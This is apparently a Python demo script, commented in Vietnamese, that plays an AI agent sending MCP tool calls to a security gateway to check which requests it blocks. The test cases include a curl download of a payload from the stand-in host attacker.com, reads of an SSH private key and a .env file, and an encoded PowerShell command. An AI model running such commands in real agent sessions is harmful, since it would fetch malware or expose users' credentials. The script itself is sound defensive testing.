"""
Demo chứng minh MCP Security Gateway intercept và block các tools/call nguy hiểm.

Kịch bản:
1. (Thực tế) Bạn cần chạy `python main.py` ở một terminal khác trước.
2. Script này giả lập MCP Server ở port 8766.
3. Script này đóng vai AI Agent (MCP Client), gửi request tới MCP Gateway ở port 8765.
4. Gateway sẽ phân tích request:
   - Các lệnh an toàn -> Forward sang MCP Server.
   - Các lệnh nguy hiểm -> Block ngay lập tức và trả về error cho Client, KHÔNG forward.
"""

import asyncio
import json
import logging
import time

# --- Setup minimal logging ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("Demo")

class MockMCPServer:
    """Giả lập backend MCP Server. Nhận các request hợp lệ từ Gateway."""
    def __init__(self, port=8766):
        self.port = port
        self.server = None

    async def start(self):
        self.server = await asyncio.start_server(
            self.handle_client, "127.0.0.1", self.port
        )
        logger.info(f"[MockServer] Started on port {self.port}")

    async def stop(self):
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            logger.info("[MockServer] Stopped")

    async def handle_client(self, reader, writer):
        buffer = b""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                buffer += data
                
                # Simple newline delimited or Content-Length framing parsing
                # For demo, we just split by Content-Length framing if present
                if b"\r\n\r\n" in buffer:
                    header, content = buffer.split(b"\r\n\r\n", 1)
                    # Giả sử luôn nhận đủ content cho demo
                    
                    try:
                        msg = json.loads(content)
                        req_id = msg.get("id")
                        logger.info(f"[MockServer] Nhận request an toàn, id={req_id}, method={msg.get('method')}")
                        
                        # Trả về kết quả giả
                        resp = {
                            "jsonrpc": "2.0",
                            "id": req_id,
                            "result": {"content": [{"type": "text", "text": "Thực thi thành công tại Backend!"}]}
                        }
                        
                        # Encode with framing
                        resp_json = json.dumps(resp).encode("utf-8")
                        resp_framed = f"Content-Length: {len(resp_json)}\r\n\r\n".encode("utf-8") + resp_json
                        writer.write(resp_framed)
                        await writer.drain()
                        
                        buffer = b"" # Reset buffer
                    except json.JSONDecodeError:
                        pass
        except Exception as e:
            logger.error(f"[MockServer] Error: {e}")
        finally:
            writer.close()

async def send_mcp_request(name: str, method: str, params: dict, expected: str):
    """Giả lập AI Agent gửi request tới MCP Gateway (port 8765)"""
    logger.info(f"\n--- Gửi request: {name} ---")
    logger.info(f"Tool: {params.get('name', method)}")
    logger.info(f"Args: {json.dumps(params.get('arguments', params.get('uri', '')))}")
    
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", 8765)
        
        req = {
            "jsonrpc": "2.0",
            "id": int(time.time() * 1000),
            "method": method,
            "params": params
        }
        
        req_json = json.dumps(req).encode("utf-8")
        req_framed = f"Content-Length: {len(req_json)}\r\n\r\n".encode("utf-8") + req_json
        
        writer.write(req_framed)
        await writer.drain()
        
        # Chờ response
        data = await reader.read(4096)
        if data:
            if b"\r\n\r\n" in data:
                _, content = data.split(b"\r\n\r\n", 1)
                try:
                    resp = json.loads(content)
                    if "error" in resp:
                        logger.warning(f"-> [Client Nhận] ERROR: {resp['error']['message']}")
                        logger.warning(f"-> Phán đoán Gateway: ĐÃ CHẶN! (Kỳ vọng: {expected})")
                    else:
                        logger.info(f"-> [Client Nhận] SUCCESS: {resp.get('result', {}).get('content', [{}])[0].get('text')}")
                        logger.info(f"-> Phán đoán Gateway: ĐÃ CHO QUA! (Kỳ vọng: {expected})")
                except json.JSONDecodeError:
                    logger.error("-> Lỗi parse JSON response")
        
        writer.close()
        await writer.wait_closed()
        
    except ConnectionRefusedError:
        logger.error("[LỖI] Không thể kết nối tới MCP Gateway ở port 8765.")
        logger.error("Hãy đảm bảo bạn đã chạy 'python main.py' ở một terminal khác!")

async def main():
    print("=" * 60)
    print("DEMO: MCP Security Gateway Interception")
    print("=" * 60)
    
    mock_server = MockMCPServer(port=8766)
    await mock_server.start()
    
    await asyncio.sleep(1) # Đợi xíu cho server lên hẳn
    
    # Kịch bản 1: Lệnh an toàn -> ALLOW
    await send_mcp_request(
        name="Lệnh an toàn (ls)",
        method="tools/call",
        params={"name": "run_command", "arguments": {"command": "ls -la"}},
        expected="ALLOW"
    )
    await asyncio.sleep(1)
    
    # Kịch bản 2: Tải file độc hại -> BLOCK
    await send_mcp_request(
        name="Tải malware",
        method="tools/call",
        params={"name": "run_command", "arguments": {"command": "curl http://attacker.com/payload.exe -o payload.exe"}},
        expected="BLOCK (Suspicious domain + Command)"
    )
    await asyncio.sleep(1)
    
    # Kịch bản 3: Đọc file nhạy cảm qua tools/call -> BLOCK
    await send_mcp_request(
        name="Đọc SSH Key",
        method="tools/call",
        params={"name": "read_file", "arguments": {"path": "/home/user/.ssh/id_rsa"}},
        expected="BLOCK (Sensitive Path)"
    )
    await asyncio.sleep(1)
    
    # Kịch bản 4: Đọc file nhạy cảm qua resources/read -> BLOCK
    await send_mcp_request(
        name="Đọc .env qua Resource",
        method="resources/read",
        params={"uri": "file:///path/to/project/.env.production"},
        expected="BLOCK (Sensitive Path)"
    )
    await asyncio.sleep(1)
    
    # Kịch bản 5: Code execution -> BLOCK
    await send_mcp_request(
        name="Thực thi PowerShell Encode",
        method="tools/call",
        params={"name": "shell", "arguments": {"script": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."}},
        expected="BLOCK (Dangerous Pattern)"
    )
    
    await asyncio.sleep(1)
    await mock_server.stop()
    print("\n" + "=" * 60)
    print("Demo completed! Please check 'python main.py' logs to see events pushed to Pipeline.")

if __name__ == "__main__":
    asyncio.run(main())
